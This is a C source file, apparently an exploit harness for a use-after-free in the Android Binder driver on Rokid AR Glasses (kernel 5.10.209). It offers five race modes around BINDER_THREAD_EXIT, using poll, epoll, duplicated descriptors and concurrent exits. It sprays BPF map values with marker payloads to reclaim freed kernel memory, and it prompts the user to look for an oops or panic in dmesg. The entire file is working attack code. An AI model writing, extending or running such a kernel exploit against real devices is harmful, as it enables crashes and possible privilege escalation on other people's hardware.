/*
 * binder_uaf_v5.c - Multi-Attack Binder UAF
 *
 * Target: Rokid AR Glasses (Kernel 5.10.209)
 *
 * Compile:
 * $CC -static -O2 -pthread -o binder_uaf_v5 binder_uaf_v5.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <linux/bpf.h>

// ---------- Binder Definitions ----------
typedef __u64 binder_size_t;
typedef __u64 binder_uintptr_t;

#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, __u32)
#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)

struct binder_write_read
{
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};

#define BC_ENTER_LOOPER 0x0000630c
#define BC_EXIT_LOOPER 0x0000630d

// ---------- BPF ----------
#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

// ---------- Config ----------
#define SPRAY_VALUE_SIZE 440
#define SPRAY_COUNT 8192
#define NUM_SPRAY_MAPS 8
#define RACE_ITERATIONS 50000

static int bpf_map_fds[NUM_SPRAY_MAPS];
static volatile int g_stop = 0;
static volatile unsigned long g_spray_count = 0;
static volatile unsigned long g_race_count = 0;

static unsigned char g_payload[SPRAY_VALUE_SIZE];

// Shared fd for worker threads
static volatile int g_shared_dups[16];

// ---------- CPU Pinning ----------
static void pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

// ---------- Payload ----------
static void build_payload(void)
{
    memset(g_payload, 0, SPRAY_VALUE_SIZE);
    *(unsigned long *)&g_payload[128] = 0xDEADBEEFCAFEBABEUL;
    *(unsigned long *)&g_payload[136] = 0x4141414141414141UL;
}

// ---------- BPF Maps ----------
static int create_bpf_maps(void)
{
    for (int i = 0; i < NUM_SPRAY_MAPS; i++)
    {
        union bpf_attr attr = {0};
        attr.map_type = BPF_MAP_TYPE_HASH;
        attr.key_size = sizeof(int);
        attr.value_size = SPRAY_VALUE_SIZE;
        attr.max_entries = SPRAY_COUNT;

        bpf_map_fds[i] = bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
        if (bpf_map_fds[i] < 0)
            return -1;
    }
    return 0;
}

static inline void spray_burst(int count)
{
    for (int i = 0; i < count; i++)
    {
        int map_idx = rand() % NUM_SPRAY_MAPS;
        int key = rand() % SPRAY_COUNT;

        union bpf_attr attr = {0};
        attr.map_fd = bpf_map_fds[map_idx];
        attr.key = (unsigned long)&key;
        bpf_syscall(BPF_MAP_DELETE_ELEM, &attr, sizeof(attr));

        attr.value = (unsigned long)g_payload;
        bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

        __sync_fetch_and_add(&g_spray_count, 1);
    }
}

// ---------- Spray Thread ----------
static void *spray_worker(void *arg)
{
    pin_to_cpu((int)(long)arg);
    while (!g_stop)
    {
        spray_burst(128);
        sched_yield();
    }
    return NULL;
}

// ---------- Worker Thread Functions ----------

static void *poll_worker_fn(void *arg)
{
    int fd = (int)(long)arg;
    pin_to_cpu(1);
    struct pollfd pfd = {.fd = fd, .events = POLLIN | POLLERR};
    poll(&pfd, 1, 10);
    return NULL;
}

static void *exit_worker_fn(void *arg)
{
    int fd = (int)(long)arg;
    pin_to_cpu(rand() % 4);
    __s32 dummy = 0;
    ioctl(fd, BINDER_THREAD_EXIT, &dummy);
    return NULL;
}

static void *close_dups_fn(void *arg)
{
    (void)arg;
    pin_to_cpu(1);
    for (int i = 0; i < 16; i++)
    {
        int fd = g_shared_dups[i];
        if (fd >= 0)
            close(fd);
    }
    return NULL;
}

static void *epoll_wait_fn(void *arg)
{
    int epfd = (int)(long)arg;
    pin_to_cpu(2);
    struct epoll_event events[4];
    epoll_wait(epfd, events, 4, 5);
    return NULL;
}

// ---------- Attack Functions ----------

static void attack_poll_race(int binder_fd)
{
    pthread_t poll_tid;
    pthread_create(&poll_tid, NULL, poll_worker_fn, (void *)(long)binder_fd);

    pin_to_cpu(0);
    usleep(1);
    __s32 dummy = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, &dummy);

    pthread_join(poll_tid, NULL);
}

static void attack_rapid_cycle(int iterations)
{
    for (int i = 0; i < iterations; i++)
    {
        int fd = open("/dev/binder", O_RDWR);
        if (fd < 0)
            continue;

        void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
        if (map == MAP_FAILED)
        {
            close(fd);
            continue;
        }

        __u32 cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr = {0};
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (binder_uintptr_t)&cmd;
        ioctl(fd, BINDER_WRITE_READ, &bwr);

        __s32 dummy = 0;
        ioctl(fd, BINDER_THREAD_EXIT, &dummy);

        spray_burst(8);

        munmap(map, 4096);
        close(fd);

        __sync_fetch_and_add(&g_race_count, 1);
    }
}

static void attack_double_exit(void)
{
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0)
        return;

    void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED)
    {
        close(fd);
        return;
    }

    __u32 cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {0};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    ioctl(fd, BINDER_WRITE_READ, &bwr);

    pthread_t t1, t2;
    pthread_create(&t1, NULL, exit_worker_fn, (void *)(long)fd);
    pthread_create(&t2, NULL, exit_worker_fn, (void *)(long)fd);

    spray_burst(32);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    munmap(map, 4096);
    close(fd);

    __sync_fetch_and_add(&g_race_count, 1);
}

static void attack_dup_race(void)
{
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0)
        return;

    void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED)
    {
        close(fd);
        return;
    }

    for (int i = 0; i < 16; i++)
    {
        g_shared_dups[i] = dup(fd);
    }

    __u32 cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {0};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    ioctl(fd, BINDER_WRITE_READ, &bwr);

    pthread_t close_tid;
    pthread_create(&close_tid, NULL, close_dups_fn, NULL);

    pin_to_cpu(0);
    for (int i = 0; i < 10; i++)
    {
        __s32 dummy = 0;
        ioctl(fd, BINDER_THREAD_EXIT, &dummy);
        spray_burst(4);
    }

    pthread_join(close_tid, NULL);

    munmap(map, 4096);
    close(fd);

    __sync_fetch_and_add(&g_race_count, 1);
}

static void attack_epoll_exit(void)
{
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0)
        return;

    void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED)
    {
        close(fd);
        return;
    }

    int epfd = epoll_create1(0);
    if (epfd < 0)
    {
        munmap(map, 4096);
        close(fd);
        return;
    }

    struct epoll_event ev = {.events = EPOLLIN | EPOLLERR, .data.fd = fd};
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);

    __u32 cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {0};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    ioctl(fd, BINDER_WRITE_READ, &bwr);

    pthread_t exit_tid, epoll_tid;
    pthread_create(&exit_tid, NULL, exit_worker_fn, (void *)(long)fd);
    pthread_create(&epoll_tid, NULL, epoll_wait_fn, (void *)(long)epfd);

    spray_burst(16);

    pthread_join(exit_tid, NULL);
    pthread_join(epoll_tid, NULL);

    close(epfd);
    munmap(map, 4096);
    close(fd);

    __sync_fetch_and_add(&g_race_count, 1);
}

// ---------- Signal Handler ----------
static void sigint_handler(int sig)
{
    (void)sig;
    g_stop = 1;
}

// ---------- Main ----------
int main(int argc, char *argv[])
{
    setbuf(stdout, NULL);
    signal(SIGINT, sigint_handler);

    int iterations = RACE_ITERATIONS;
    int mode = 0;
    if (argc > 1)
        iterations = atoi(argv[1]);
    if (argc > 2)
        mode = atoi(argv[2]);

    printf("==============================================\n");
    printf("   Binder UAF v5 - Multi-Attack              \n");
    printf("==============================================\n\n");

    build_payload();

    printf("[*] Creating BPF maps...\n");
    if (create_bpf_maps() < 0)
    {
        perror("BPF");
        return 1;
    }

    pthread_t spray_tids[2];
    pthread_create(&spray_tids[0], NULL, spray_worker, (void *)4L);
    pthread_create(&spray_tids[1], NULL, spray_worker, (void *)5L);

    const char *mode_names[] = {"Combined", "Rapid", "Double Exit", "Dup Race", "Epoll+Exit"};
    printf("[*] Mode %d: %s, %d iterations\n", mode, mode_names[mode % 5], iterations);

    switch (mode)
    {
    case 0:
        for (int i = 0; i < iterations && !g_stop; i++)
        {
            if (i % 5000 == 0)
            {
                printf("[*] %d/%d, Races %lu, Sprays %lu\r",
                       i, iterations, g_race_count, g_spray_count);
                fflush(stdout);
            }
            int fd = open("/dev/binder", O_RDWR);
            if (fd < 0)
                continue;
            void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
            if (map != MAP_FAILED)
            {
                attack_poll_race(fd);
                munmap(map, 4096);
            }
            close(fd);
            __sync_fetch_and_add(&g_race_count, 1);
        }
        break;

    case 1:
        attack_rapid_cycle(iterations);
        break;

    case 2:
        for (int i = 0; i < iterations && !g_stop; i++)
        {
            attack_double_exit();
            if (i % 5000 == 0)
                printf("[*] %d/%d\r", i, iterations);
        }
        break;

    case 3:
        for (int i = 0; i < iterations && !g_stop; i++)
        {
            attack_dup_race();
            if (i % 2000 == 0)
                printf("[*] %d/%d\r", i, iterations);
        }
        break;

    case 4:
        for (int i = 0; i < iterations && !g_stop; i++)
        {
            attack_epoll_exit();
            if (i % 5000 == 0)
                printf("[*] %d/%d\r", i, iterations);
        }
        break;

    default:
        attack_rapid_cycle(iterations);
    }

    g_stop = 1;
    pthread_join(spray_tids[0], NULL);
    pthread_join(spray_tids[1], NULL);

    printf("\n==============================================\n");
    printf("   Done: Races=%lu, Sprays=%lu              \n", g_race_count, g_spray_count);
    printf("==============================================\n");

    FILE *f = fopen("/proc/uptime", "r");
    if (f)
    {
        char buf[64];
        if (fgets(buf, sizeof(buf), f))
            printf("[+] Uptime: %s", buf);
        fclose(f);
    }

    printf("[*] Check: dmesg | grep -iE 'DEAD|CAFE|oops|panic'\n");

    for (int i = 0; i < NUM_SPRAY_MAPS; i++)
        close(bpf_map_fds[i]);
    return 0;
}
